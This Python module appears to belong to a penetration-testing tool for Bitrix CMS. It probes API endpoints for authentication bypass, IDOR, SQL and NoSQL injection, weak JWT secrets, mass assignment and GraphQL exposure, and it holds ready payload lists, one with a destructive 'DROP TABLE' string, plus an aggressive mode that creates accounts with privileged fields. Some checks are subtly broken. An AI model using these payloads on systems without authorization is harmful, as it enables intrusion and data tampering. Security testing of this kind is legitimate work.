#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
API Scanner Module for Bitrix Pentest Tool
Tests for: REST API, SOAP API, GraphQL vulnerabilities,
Authentication bypass, IDOR, Mass Assignment, Rate limiting
Based on: https://pentestnotes.ru/notes/bitrix_pentest_full/
"""

import re
import json
import base64
import jwt
import urllib.parse
from urllib.parse import urljoin, quote, parse_qs, urlparse
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, field, asdict


@dataclass
class APIFinding:
    """API vulnerability finding"""
    severity: str  # critical, high, medium, low, info
    vuln_type: str  # auth_bypass, idor, sqli, nosql, mass_assignment, info_disclosure, misconfig, rate_limit_bypass
    url: str
    method: str
    parameter: Optional[str]
    payload: Optional[str]
    description: str
    evidence: Optional[str] = None
    response_code: Optional[int] = None
    impact: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class APIResult:
    """Results of API scanning"""
    target: str
    findings: List[APIFinding] = field(default_factory=list)
    auth_issues: List[Dict] = field(default_factory=list)
    idor_vulns: List[Dict] = field(default_factory=list)
    injection_vulns: List[Dict] = field(default_factory=list)
    mass_assignment_vulns: List[Dict] = field(default_factory=list)
    info_disclosure: List[Dict] = field(default_factory=list)
    misconfigurations: List[Dict] = field(default_factory=list)
    discovered_endpoints: List[str] = field(default_factory=list)
    api_versions: List[str] = field(default_factory=list)
    
    def add_finding(self, finding: APIFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.vuln_type == 'auth_bypass':
            self.auth_issues.append(finding_dict)
        elif finding.vuln_type == 'idor':
            self.idor_vulns.append(finding_dict)
        elif finding.vuln_type in ['sqli', 'nosql', 'command_injection']:
            self.injection_vulns.append(finding_dict)
        elif finding.vuln_type == 'mass_assignment':
            self.mass_assignment_vulns.append(finding_dict)
        elif finding.vuln_type == 'info_disclosure':
            self.info_disclosure.append(finding_dict)
        elif finding.vuln_type == 'misconfig':
            self.misconfigurations.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def get_high_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'high')
    
    def get_medium_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'medium')
    
    def get_low_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'low')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': self.get_high_count(),
                'medium': self.get_medium_count(),
                'low': self.get_low_count(),
                'auth_issues': len(self.auth_issues),
                'idor_vulns': len(self.idor_vulns),
                'injection_vulns': len(self.injection_vulns),
                'mass_assignment_vulns': len(self.mass_assignment_vulns),
                'info_disclosure': len(self.info_disclosure),
                'misconfigurations': len(self.misconfigurations),
                'discovered_endpoints': len(self.discovered_endpoints),
                'api_versions': len(self.api_versions),
            },
            'discovered_endpoints': self.discovered_endpoints,
            'api_versions': self.api_versions,
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixAPIScanner:
    """
    API scanner specialized for Bitrix CMS
    Tests REST API, SOAP, and mobile API endpoints
    """
    
    # Bitrix API endpoints
    API_ENDPOINTS = [
        # REST API
        {'name': 'REST API Root', 'url': '/rest/', 'type': 'rest', 'auth': False},
        {'name': 'REST API (bitrix)', 'url': '/bitrix/rest/', 'type': 'rest', 'auth': False},
        {'name': 'Mobile API', 'url': '/bitrix/services/mobile/', 'type': 'mobile', 'auth': True},
        {'name': 'Mobile API (new)', 'url': '/mobile/', 'type': 'mobile', 'auth': True},
        
        # SOAP API
        {'name': 'SOAP Server', 'url': '/bitrix/soap/', 'type': 'soap', 'auth': True},
        {'name': 'SOAP WS', 'url': '/bitrix/soap/ws/', 'type': 'soap', 'auth': True},
        {'name': '1C SOAP', 'url': '/bitrix/soap/1c/', 'type': 'soap', 'auth': True},
        
        # GraphQL (если есть)
        {'name': 'GraphQL', 'url': '/graphql/', 'type': 'graphql', 'auth': False},
        {'name': 'GraphQL (bitrix)', 'url': '/bitrix/graphql/', 'type': 'graphql', 'auth': False},
        
        # Legacy API
        {'name': 'API Controller', 'url': '/api/', 'type': 'rest', 'auth': False},
        {'name': 'API v1', 'url': '/api/v1/', 'type': 'rest', 'auth': True},
        {'name': 'API v2', 'url': '/api/v2/', 'type': 'rest', 'auth': True},
        
        # Bitrix specific
        {'name': 'Bitrix API', 'url': '/bitrix/api/', 'type': 'rest', 'auth': True},
        {'name': 'Cloud API', 'url': '/bitrix/cloud/', 'type': 'rest', 'auth': True},
        {'name': 'Controller API', 'url': '/bitrix/controller/', 'type': 'rest', 'auth': True},
        
        # JSON-RPC
        {'name': 'JSON-RPC', 'url': '/jsonrpc/', 'type': 'jsonrpc', 'auth': False},
        {'name': 'JSON-RPC (bitrix)', 'url': '/bitrix/jsonrpc/', 'type': 'jsonrpc', 'auth': False},
    ]
    
    # Common REST methods in Bitrix
    REST_METHODS = [
        'user.get',
        'user.current',
        'user.search',
        'user.update',
        'user.delete',
        'department.get',
        'sonet_group.get',
        'sonet_group.user.get',
        'tasks.task.list',
        'tasks.task.get',
        'tasks.task.add',
        'tasks.task.update',
        'tasks.task.delete',
        'crm.contact.list',
        'crm.contact.get',
        'crm.contact.add',
        'crm.company.list',
        'crm.deal.list',
        'crm.lead.list',
        'crm.product.list',
        'catalog.product.list',
        'sale.order.list',
        'sale.order.get',
        'iblock.element.list',
        'iblock.element.get',
        'iblock.section.list',
        'fileman.file.list',
        'fileman.file.get',
        'calendar.event.get',
        'calendar.event.add',
        'im.message.add',
        'im.dialog.messages.get',
        'bizproc.workflow.start',
        'bizproc.task.list',
        'documentgenerator.template.list',
        'documentgenerator.document.add',
    ]
    
    # JWT test payloads
    JWT_PAYLOADS = [
        # None algorithm
        {'alg': 'none', 'typ': 'JWT'},
        # Empty key
        {'alg': 'HS256', 'typ': 'JWT'},
        # Algorithm confusion
        {'alg': 'RS256', 'typ': 'JWT'},
        # Expired
        {'alg': 'HS256', 'typ': 'JWT', 'exp': 0},
    ]
    
    # SQLi payloads for API testing
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' UNION SELECT null--",
        "1' UNION SELECT version()--",
        "1' UNION SELECT @@version--",
        "1'; DROP TABLE users; --",
        "1' OR '1'='1' /*",
        "1' OR 1=1#",
        "1' OR '1'='1'--",
        "1' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables--",
    ]
    
    # NoSQL injection payloads
    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$gt": ""}',
        '{"$lt": ""}',
        '{"$exists": true}',
    ]
    
    # Mass assignment test fields
    MASS_ASSIGNMENT_FIELDS = [
        'is_admin',
        'admin',
        'role',
        'permissions',
        'password',
        'email_verified',
        'active',
        'deleted',
        'created_at',
        'updated_at',
        'id',
        'user_id',
        'owner_id',
        'group_id',
        'access_level',
        'privileges',
        'superuser',
        'is_superuser',
    ]
    
    # IDOR test patterns
    IDOR_PATTERNS = [
        ('id', [1, 2, 3, 999, 1000]),
        ('user_id', [1, 2, 3, 999]),
        ('order_id', [1, 2, 100, 9999]),
        ('file_id', [1, 2, 100]),
        ('document_id', [1, 2, 100]),
        ('task_id', [1, 2, 100]),
        ('deal_id', [1, 2, 100]),
        ('contact_id', [1, 2, 100]),
        ('company_id', [1, 2, 100]),
        ('group_id', [1, 2, 100]),
        ('element_id', [1, 2, 100]),
        ('section_id', [1, 2, 100]),
    ]
    
    # API key patterns
    API_KEY_PATTERNS = [
        r'[a-f0-9]{32}',  # MD5
        r'[a-f0-9]{40}',  # SHA1
        r'[a-f0-9]{64}',  # SHA256
        r'[A-Za-z0-9]{20,}',  # Generic token
        r'bx_[a-z0-9_]+',  # Bitrix specific
        r'api_[a-z0-9_]+',  # API key
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.discovered_apis = []
        self.auth_tokens = []
        
    def scan(self, target_url: str, aggressive: bool = False) -> APIResult:
        """
        Main API scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable aggressive testing (actual data modification, brute force)
        
        Returns:
            APIResult with all findings
        """
        self.logger.info(f"Starting API scan for {target_url}")
        result = APIResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Discover API endpoints
        self.logger.info("Discovering API endpoints...")
        self._discover_apis(base_url, result)
        
        # 2. Test authentication
        self.logger.info("Testing API authentication...")
        self._test_authentication(base_url, result)
        
        # 3. Test for IDOR
        self.logger.info("Testing for IDOR vulnerabilities...")
        self._test_idor(base_url, result)
        
        # 4. Test for injections
        self.logger.info("Testing for SQL/NoSQL injections...")
        self._test_injections(base_url, result)
        
        # 5. Test for mass assignment
        if aggressive:
            self.logger.info("Testing for mass assignment...")
            self._test_mass_assignment(base_url, result)
        
        # 6. Test rate limiting
        self.logger.info("Testing rate limiting...")
        self._test_rate_limiting(base_url, result)
        
        # 7. Test JWT vulnerabilities
        self.logger.info("Testing JWT implementation...")
        self._test_jwt(base_url, result)
        
        # 8. Test GraphQL (if discovered)
        if any('graphql' in ep for ep in result.discovered_endpoints):
            self.logger.info("Testing GraphQL endpoints...")
            self._test_graphql(base_url, result)
        
        # 9. Information disclosure
        self.logger.info("Testing for information disclosure...")
        self._test_info_disclosure(base_url, result)
        
        # 10. API documentation exposure
        self.logger.info("Checking for exposed API documentation...")
        self._check_api_docs(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"API scan complete: {total} findings ({critical} critical)")
        
        if result.discovered_endpoints:
            self.logger.info(f"Discovered endpoints: {len(result.discovered_endpoints)}")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_apis(self, base_url: str, result: APIResult):
        """Discover API endpoints"""
        for endpoint in self.API_ENDPOINTS:
            url = urljoin(base_url, endpoint['url'])
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code in [200, 401, 403, 405]:
                    self.discovered_apis.append({
                        **endpoint,
                        'full_url': url,
                        'status': resp.status_code,
                        'response': resp.text[:500]
                    })
                    result.discovered_endpoints.append(url)
                    
                    self.logger.info(f"Found API: {endpoint['name']} ({resp.status_code})")
                    
                    # Check if unauthenticated access
                    if resp.status_code == 200 and endpoint['auth']:
                        finding = APIFinding(
                            severity='critical',
                            vuln_type='auth_bypass',
                            url=url,
                            method='GET',
                            parameter=None,
                            payload=None,
                            description=f"API endpoint accessible without authentication: {endpoint['name']}",
                            evidence=resp.text[:300],
                            response_code=resp.status_code
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! UNPROTECTED API: {endpoint['name']}")
                    
                    # Try to detect API version
                    self._detect_api_version(resp, result)
                    
            except Exception as e:
                self.logger.debug(f"Error checking {endpoint['url']}: {e}")
        
        # Discover via robots.txt and sitemap
        self._discover_from_robots(base_url, result)
    
    def _detect_api_version(self, response, result: APIResult):
        """Detect API version from response"""
        version_patterns = [
            r'"version":\s*"([^"]+)"',
            r'"api_version":\s*"([^"]+)"',
            r'API\s+v?(\d+\.\d+)',
            r'version[=\s:]+(\d+\.\d+)',
        ]
        
        for pattern in version_patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                version = match.group(1)
                if version not in result.api_versions:
                    result.api_versions.append(version)
                    self.logger.info(f"Detected API version: {version}")
    
    def _discover_from_robots(self, base_url: str, result: APIResult):
        """Discover API endpoints from robots.txt"""
        try:
            robots_url = urljoin(base_url, '/robots.txt')
            resp = self.requester.get(robots_url, timeout=10)
            
            if resp:
                api_paths = re.findall(r'/(?:api|rest|graphql|soap|jsonrpc)[/\w]*', resp.text)
                for path in set(api_paths):
                    full_url = urljoin(base_url, path)
                    if full_url not in result.discovered_endpoints:
                        result.discovered_endpoints.append(full_url)
                        self.logger.info(f"Found API in robots.txt: {path}")
                        
        except Exception as e:
            self.logger.debug(f"Robots.txt check error: {e}")
    
    def _test_authentication(self, base_url: str, result: APIResult):
        """Test API authentication mechanisms"""
        for api in self.discovered_apis:
            url = api['full_url']
            
            # Test 1: Check for API key in URL
            try:
                test_url = f"{url}?api_key=test123&token=test456"
                resp = self.requester.get(test_url, timeout=10)
                
                if resp and 'api_key' in resp.text:
                    finding = APIFinding(
                        severity='medium',
                        vuln_type='info_disclosure',
                        url=test_url,
                        method='GET',
                        parameter='api_key',
                        payload='test123',
                        description='API accepts authentication in URL parameters (may be logged)',
                        evidence=resp.text[:200]
                    )
                    result.add_finding(finding)
                    self.logger.warning(f"API key in URL at {api['name']}")
                    
            except Exception as e:
                self.logger.debug(f"Auth test error: {e}")
            
            # Test 2: Test common credentials
            if api['type'] == 'rest':
                self._test_rest_auth(url, result)
            elif api['type'] == 'soap':
                self._test_soap_auth(url, result)
    
    def _test_rest_auth(self, url: str, result: APIResult):
        """Test REST API authentication"""
        # Test with empty auth
        try:
            resp = self.requester.get(f"{url}user.current", timeout=10)
            
            if resp and resp.status_code == 200:
                try:
                    data = json.loads(resp.text)
                    if 'result' in data or 'id' in data:
                        finding = APIFinding(
                            severity='critical',
                            vuln_type='auth_bypass',
                            url=f"{url}user.current",
                            method='GET',
                            parameter=None,
                            payload=None,
                            description='REST API method accessible without authentication',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! REST AUTH BYPASS: {url}")
                except:
                    pass
                    
        except Exception as e:
            self.logger.debug(f"REST auth test error: {e}")
    
    def _test_soap_auth(self, url: str, result: APIResult):
        """Test SOAP API authentication"""
        soap_payload = '''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetUserRequest xmlns="http://bitrix.ru/soap/">
<id>1</id>
</GetUserRequest>
</soap:Body>
</soap:Envelope>'''
        
        try:
            headers = {'Content-Type': 'text/xml'}
            resp = self.requester.post(url, data=soap_payload, headers=headers, timeout=10)
            
            if resp and resp.status_code == 200 and 'user' in resp.text.lower():
                finding = APIFinding(
                    severity='critical',
                    vuln_type='auth_bypass',
                    url=url,
                    method='POST',
                    parameter=None,
                    payload='SOAP request without auth',
                    description='SOAP API accessible without authentication',
                    evidence=resp.text[:300]
                )
                result.add_finding(finding)
                self.logger.critical(f"!!! SOAP AUTH BYPASS: {url}")
                
        except Exception as e:
            self.logger.debug(f"SOAP auth test error: {e}")
    
    def _test_idor(self, base_url: str, result: APIResult):
        """Test for IDOR vulnerabilities"""
        # Test common IDOR patterns in REST API
        rest_apis = [a for a in self.discovered_apis if a['type'] == 'rest']
        
        for api in rest_apis:
            base_url_api = api['full_url']
            
            for param_name, test_values in self.IDOR_PATTERNS:
                for test_id in test_values:
                    try:
                        # Test GET request
                        test_url = f"{base_url_api}user.get?id={test_id}"
                        resp = self.requester.get(test_url, timeout=10)
                        
                        if resp and resp.status_code == 200:
                            try:
                                data = json.loads(resp.text)
                                if 'result' in data and data['result']:
                                    finding = APIFinding(
                                        severity='high',
                                        vuln_type='idor',
                                        url=test_url,
                                        method='GET',
                                        parameter='id',
                                        payload=str(test_id),
                                        description=f'Potential IDOR: Access to user {test_id} without proper authorization',
                                        evidence=resp.text[:300]
                                    )
                                    result.add_finding(finding)
                                    self.logger.critical(f"!!! IDOR: Access to user {test_id} at {test_url}")
                            except:
                                pass
                                
                    except Exception as e:
                        self.logger.debug(f"IDOR test error: {e}")
    
    def _test_injections(self, base_url: str, result: APIResult):
        """Test for SQL and NoSQL injections in API"""
        for api in self.discovered_apis:
            if api['type'] not in ['rest', 'graphql']:
                continue
            
            base_url_api = api['full_url']
            
            # Test SQLi
            for payload in self.SQLI_PAYLOADS[:3]:  # Test first 3
                try:
                    test_url = f"{base_url_api}user.get?filter[NAME]={quote(payload)}"
                    resp = self.requester.get(test_url, timeout=10)
                    
                    if resp and self._detect_sqli_error(resp.text):
                        finding = APIFinding(
                            severity='critical',
                            vuln_type='sqli',
                            url=test_url,
                            method='GET',
                            parameter='filter[NAME]',
                            payload=payload,
                            description='SQL Injection in API parameter',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! SQLi in API: {test_url}")
                        break
                        
                except Exception as e:
                    self.logger.debug(f"SQLi test error: {e}")
            
            # Test NoSQLi
            for payload in self.NOSQL_PAYLOADS[:3]:
                try:
                    test_url = f"{base_url_api}user.get"
                    headers = {'Content-Type': 'application/json'}
                    data = json.dumps({"filter": {"name": json.loads(payload)}})
                    
                    resp = self.requester.post(test_url, data=data, headers=headers, timeout=10)
                    
                    if resp and resp.status_code == 200:
                        try:
                            result_data = json.loads(resp.text)
                            if len(result_data.get('result', [])) > 1:
                                finding = APIFinding(
                                    severity='critical',
                                    vuln_type='nosql',
                                    url=test_url,
                                    method='POST',
                                    parameter='filter',
                                    payload=payload,
                                    description='NoSQL Injection in API parameter',
                                    evidence=resp.text[:300]
                                )
                                result.add_finding(finding)
                                self.logger.critical(f"!!! NoSQLi in API: {test_url}")
                                break
                        except:
                            pass
                            
                except Exception as e:
                    self.logger.debug(f"NoSQLi test error: {e}")
    
    def _detect_sqli_error(self, content: str) -> bool:
        """Detect SQL error in response"""
        indicators = [
            'sql syntax',
            'mysql_fetch',
            'pg_query',
            'ora-',
            'sql server',
            'odbc',
            'jdbc',
            'PDOException',
        ]
        return any(ind.lower() in content.lower() for ind in indicators)
    
    def _test_mass_assignment(self, base_url: str, result: APIResult):
        """Test for mass assignment vulnerabilities"""
        rest_apis = [a for a in self.discovered_apis if a['type'] == 'rest']
        
        for api in rest_apis:
            base_url_api = api['full_url']
            
            # Test user creation/update with privileged fields
            for field in self.MASS_ASSIGNMENT_FIELDS[:5]:  # Test first 5
                try:
                    test_url = f"{base_url_api}user.add"
                    headers = {'Content-Type': 'application/json'}
                    
                    data = {
                        "NAME": "Test",
                        "LAST_NAME": "User",
                        "EMAIL": f"test{random.randint(1000,9999)}@example.com",
                        field: True  # Try to set privileged field
                    }
                    
                    resp = self.requester.post(
                        test_url, 
                        data=json.dumps(data), 
                        headers=headers, 
                        timeout=10
                    )
                    
                    if resp and resp.status_code == 200:
                        try:
                            result_data = json.loads(resp.text)
                            if 'result' in result_data:
                                finding = APIFinding(
                                    severity='high',
                                    vuln_type='mass_assignment',
                                    url=test_url,
                                    method='POST',
                                    parameter=field,
                                    payload=str(True),
                                    description=f'Potential mass assignment: field "{field}" accepted',
                                    evidence=resp.text[:300]
                                )
                                result.add_finding(finding)
                                self.logger.warning(f"Potential mass assignment: {field}")
                        except:
                            pass
                            
                except Exception as e:
                    self.logger.debug(f"Mass assignment test error: {e}")
    
    def _test_rate_limiting(self, base_url: str, result: APIResult):
        """Test for rate limiting bypass"""
        for api in self.discovered_apis:
            if not api.get('accessible'):
                continue
            
            url = api['full_url']
            
            # Send 10 rapid requests
            responses = []
            for i in range(10):
                try:
                    resp = self.requester.get(url, timeout=5)
                    responses.append(resp.status_code if resp else None)
                except:
                    responses.append(None)
            
            # Check if all requests succeeded (no rate limiting)
            success_count = sum(1 for r in responses if r == 200)
            
            if success_count == 10:
                finding = APIFinding(
                    severity='medium',
                    vuln_type='misconfig',
                    url=url,
                    method='GET',
                    parameter=None,
                    payload='10 rapid requests',
                    description='No rate limiting detected (10 requests allowed)',
                    evidence=f"All {success_count} requests succeeded"
                )
                result.add_finding(finding)
                self.logger.warning(f"No rate limiting at {api['name']}")
    
    def _test_jwt(self, base_url: str, result: APIResult):
        """Test JWT implementation vulnerabilities"""
        # Look for JWT tokens in responses
        for api in self.discovered_apis:
            if 'response' in api:
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                tokens = re.findall(jwt_pattern, api['response'])
                
                for token in tokens:
                    try:
                        # Decode without verification
                        decoded = jwt.decode(token, options={"verify_signature": False})
                        
                        # Check for weak secrets
                        for secret in ['secret', 'password', '123456', 'bitrix', 'admin']:
                            try:
                                jwt.decode(token, secret, algorithms=['HS256'])
                                finding = APIFinding(
                                    severity='critical',
                                    vuln_type='auth_bypass',
                                    url=api['full_url'],
                                    method='GET',
                                    parameter='Authorization',
                                    payload=f'JWT with weak secret: {secret}',
                                    description='JWT uses weak signing secret',
                                    evidence=f"Token: {token[:50]}..."
                                )
                                result.add_finding(finding)
                                self.logger.critical(f"!!! WEAK JWT SECRET: {secret}")
                                break
                            except:
                                pass
                        
                        # Check for None algorithm
                        header = jwt.get_unverified_header(token)
                        if header.get('alg') == 'none':
                            finding = APIFinding(
                                severity='critical',
                                vuln_type='auth_bypass',
                                url=api['full_url'],
                                method='GET',
                                parameter='Authorization',
                                payload='alg: none',
                                description='JWT accepts "none" algorithm',
                                evidence=str(header)
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! JWT NONE ALGORITHM at {api['name']}")
                            
                    except Exception as e:
                        self.logger.debug(f"JWT test error: {e}")
    
    def _test_graphql(self, base_url: str, result: APIResult):
        """Test GraphQL specific vulnerabilities"""
        graphql_endpoints = [e for e in result.discovered_endpoints if 'graphql' in e]
        
        for endpoint in graphql_endpoints:
            # Introspection query
            introspection_query = '''
            query IntrospectionQuery {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            '''
            
            try:
                resp = self.requester.post(
                    endpoint,
                    json={'query': introspection_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=15
                )
                
                if resp and '__schema' in resp.text:
                    finding = APIFinding(
                        severity='medium',
                        vuln_type='info_disclosure',
                        url=endpoint,
                        method='POST',
                        parameter='query',
                        payload='IntrospectionQuery',
                        description='GraphQL introspection enabled - schema disclosure',
                        evidence=resp.text[:500]
                    )
                    result.add_finding(finding)
                    self.logger.warning(f"GraphQL introspection enabled: {endpoint}")
                    
                    # Try to extract sensitive types
                    if 'password' in resp.text.lower() or 'secret' in resp.text.lower():
                        finding = APIFinding(
                            severity='high',
                            vuln_type='info_disclosure',
                            url=endpoint,
                            method='POST',
                            parameter='query',
                            payload='IntrospectionQuery',
                            description='GraphQL schema contains sensitive field names',
                            evidence='Fields: password, secret, token found in schema'
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! GraphQL exposes sensitive fields")
                
                # Test for query depth limit
                deep_query = '''
                query {
                    user {
                        friends {
                            friends {
                                friends {
                                    name
                                }
                            }
                        }
                    }
                }
                '''
                
                resp = self.requester.post(
                    endpoint,
                    json={'query': deep_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                if resp and resp.status_code == 200:
                    finding = APIFinding(
                        severity='medium',
                        vuln_type='misconfig',
                        url=endpoint,
                        method='POST',
                        parameter='query',
                        payload='Deep nested query',
                        description='GraphQL query depth limiting not enforced',
                        evidence='Deep query executed successfully'
                    )
                    result.add_finding(finding)
                    self.logger.warning(f"GraphQL depth limit not enforced: {endpoint}")
                    
            except Exception as e:
                self.logger.debug(f"GraphQL test error: {e}")
    
    def _test_info_disclosure(self, base_url: str, result: APIResult):
        """Test for information disclosure in API responses"""
        for api in self.discovered_apis:
            if 'response' not in api:
                continue
            
            response = api['response']
            
            # Check for stack traces
            if 'stack trace' in response.lower() or 'traceback' in response.lower():
                finding = APIFinding(
                    severity='medium',
                    vuln_type='info_disclosure',
                    url=api['full_url'],
                    method='GET',
                    parameter=None,
                    payload=None,
                    description='API exposes stack traces',
                    evidence=response[:400]
                )
                result.add_finding(finding)
                self.logger.warning(f"Stack trace exposure at {api['name']}")
            
            # Check for API keys in response
            for pattern in self.API_KEY_PATTERNS:
                matches = re.findall(pattern, response)
                for match in matches[:3]:  # Limit findings
                    finding = APIFinding(
                        severity='high',
                        vuln_type='info_disclosure',
                        url=api['full_url'],
                        method='GET',
                        parameter=None,
                        payload=None,
                        description='Potential API key/token exposed in response',
                        evidence=f"Pattern match: {match[:20]}..."
                    )
                    result.add_finding(finding)
                    self.logger.warning(f"Potential API key exposure at {api['name']}")
    
    def _check_api_docs(self, base_url: str, result: APIResult):
        """Check for exposed API documentation"""
        doc_paths = [
            '/api/docs/',
            '/api/documentation/',
            '/swagger/',
            '/swagger-ui/',
            '/swagger.json',
            '/openapi.json',
            '/api/swagger/',
            '/rest/docs/',
            '/graphql/playground',
            '/graphiql',
        ]
        
        for path in doc_paths:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code == 200:
                    finding = APIFinding(
                        severity='info',
                        vuln_type='info_disclosure',
                        url=url,
                        method='GET',
                        parameter=None,
                        payload=None,
                        description='API documentation publicly accessible',
                        evidence=resp.text[:200]
                    )
                    result.add_finding(finding)
                    self.logger.info(f"API docs found: {path}")
                    
            except Exception as e:
                self.logger.debug(f"Docs check error: {e}")


# Testing
if __name__ == "__main__":
    import sys
    import logging
    import random
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixAPIScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Auth Issues: {len(result.auth_issues)}")
        print(f"IDOR Vulns: {len(result.idor_vulns)}")
        print(f"Injection Vulns: {len(result.injection_vulns)}")
        print(f"Mass Assignment: {len(result.mass_assignment_vulns)}")
        print(f"Info Disclosure: {len(result.info_disclosure)}")
        print(f"Misconfigurations: {len(result.misconfigurations)}")
        print(f"Discovered Endpoints: {len(result.discovered_endpoints)}")
        print(f"Findings: {len(result.findings)}")